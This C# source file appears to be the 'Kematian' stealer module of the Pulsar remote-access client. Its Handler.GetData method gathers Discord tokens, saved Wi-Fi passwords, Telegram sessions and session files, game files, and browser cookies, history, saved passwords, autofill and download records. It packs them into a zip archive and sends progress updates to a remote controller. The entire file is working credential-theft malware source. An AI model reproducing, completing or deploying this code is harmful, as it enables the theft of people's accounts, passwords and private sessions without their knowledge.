using Pulsar.Client.Kematian.Browsers;
using Pulsar.Client.Kematian.Discord;
using Pulsar.Client.Kematian.Wifi;
using Pulsar.Client.Kematian.Telegram;
using Pulsar.Client.Kematian.Games;
using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using Pulsar.Common.Networking;
using Pulsar.Common.Messages;

namespace Pulsar.Client.Kematian
{
    public class Handler
    {
        public static byte[] GetData(ISender client = null)
        {
            byte[] data = null;
            
            if (client != null)
                client.Send(new SetStatus { Message = "Kematian - Started retrieving" });
            
            using (var memoryStream = new MemoryStream())
            {
                using (var archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
                {
                    if (client != null)
                        client.Send(new SetStatus { Message = "Kematian - 5%" });
                    
                    var retriever = new BrowsersRetriever();

                    if (client != null)
                        client.Send(new SetStatus { Message = "Kematian - 15%" });
                    
                    var browsers = retriever.GetBrowserList();
                    
                    if (client != null)
                        client.Send(new SetStatus { Message = "Kematian - 25%" });
                    
                    var textMethods = new KeyValuePair<Func<string>, string>[]
                    {
                        new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
                        new KeyValuePair<Func<string>, string>(GetWifis.Passwords, "Wifi\\Wifi.txt"),
                        new KeyValuePair<Func<string>, string>(TelegramRetriever.GetTelegramSessions, "Telegram\\sessions.txt")
                    };

                    if (client != null)
                        client.Send(new SetStatus { Message = "Kematian - 30%" });
                        
                    foreach (var methodPair in textMethods)
                    {
                        try
                        {
                            var content = methodPair.Key();
                            var zipEntry = archive.CreateEntry(methodPair.Value);
                            using (var entryStream = new BufferedStream(zipEntry.Open()))
                            using (var streamWriter = new StreamWriter(entryStream))
                            {
                                streamWriter.Write(content);
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error processing {methodPair.Value}: {ex.Message}");
                        }
                    }

                    if (client != null)
                        client.Send(new SetStatus { Message = "Kematian - 40%" });

                    try
                    {
                        int browserCount = browsers.Count;
                        int currentBrowser = 0;
                        
                        foreach (var browser in browsers)
                        {
                            currentBrowser++;
                            int browserProgress = 40 + (currentBrowser * 40 / browserCount);
                            if (client != null)
                                client.Send(new SetStatus { Message = $"Kematian - {browserProgress}%" });
                                
                            string browserName = browser.Name;
                            try
                            {
                                var content = retriever.GetCookiesForBrowser(browser);
                                if (!string.IsNullOrEmpty(content))
                                {
                                    var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\cookies_netscape.txt");
                                    using (var entryStream = new BufferedStream(zipEntry.Open()))
                                    using (var streamWriter = new StreamWriter(entryStream))
                                    {
                                        streamWriter.Write(content);
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error processing cookies for {browserName}: {ex.Message}");
                            }

                            try
                            {
                                var content = retriever.GetHistoryForBrowser(browser);
                                if (!string.IsNullOrEmpty(content) && content != "[]")
                                {
                                    var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\history.json");
                                    using (var entryStream = new BufferedStream(zipEntry.Open()))
                                    using (var streamWriter = new StreamWriter(entryStream))
                                    {
                                        streamWriter.Write(content);
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error processing history for {browserName}: {ex.Message}");
                            }

                            try
                            {
                                var content = retriever.GetPasswordsForBrowser(browser);
                                if (!string.IsNullOrEmpty(content) && content != "[]")
                                {
                                    var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\passwords.json");
                                    using (var entryStream = new BufferedStream(zipEntry.Open()))
                                    using (var streamWriter = new StreamWriter(entryStream))
                                    {
                                        streamWriter.Write(content);
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error processing passwords for {browserName}: {ex.Message}");
                            }


                            if (browser.IsChromium || browser.IsGecko)
                            {
                                try
                                {
                                    var content = retriever.GetAutoFillForBrowser(browser);
                                    if (!string.IsNullOrEmpty(content) && content != "[]")
                                    {
                                        var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\autofill.json");
                                        using (var entryStream = new BufferedStream(zipEntry.Open()))
                                        using (var streamWriter = new StreamWriter(entryStream))
                                        {
                                            streamWriter.Write(content);
                                        }
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Debug.WriteLine($"Error processing autofill for {browserName}: {ex.Message}");
                                }
                            }

                            if (browser.IsChromium || browser.IsGecko)
                            {
                                try
                                {
                                    var content = retriever.GetDownloadsForBrowser(browser);
                                    if (!string.IsNullOrEmpty(content) && content != "[]")
                                    {
                                        var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\downloads.json");
                                        using (var entryStream = new BufferedStream(zipEntry.Open()))
                                        using (var streamWriter = new StreamWriter(entryStream))
                                        {
                                            streamWriter.Write(content);
                                        }
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Debug.WriteLine($"Error processing downloads for {browserName}: {ex.Message}");
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error processing browser data: {ex.Message}");
                    }

                    if (client != null)
                        client.Send(new SetStatus { Message = "Kematian - 80%" });

                    try
                    {
                        var telegramFiles = TelegramRetriever.GetTelegramSessionFiles();
                        foreach (var file in telegramFiles)
                        {
                            var zipEntry = archive.CreateEntry(file.Key);
                            using (var entryStream = new BufferedStream(zipEntry.Open()))
                            {
                                entryStream.Write(file.Value, 0, file.Value.Length);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error processing Telegram session files: {ex.Message}");
                    }

                    if (client != null)
                        client.Send(new SetStatus { Message = "Kematian - 90%" });

                    try
                    {
                        var gameFiles = GamesRetriever.GetGameFiles();
                        foreach (var file in gameFiles)
                        {
                            var zipEntry = archive.CreateEntry(file.Key);
                            using (var entryStream = new BufferedStream(zipEntry.Open()))
                            {
                                entryStream.Write(file.Value, 0, file.Value.Length);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error processing game files: {ex.Message}");
                    }
                }
                data = memoryStream.ToArray();
            }
            
            if (client != null)
                client.Send(new SetStatus { Message = "Kematian - Finished!" });
                
            return data;
        }
    }
}
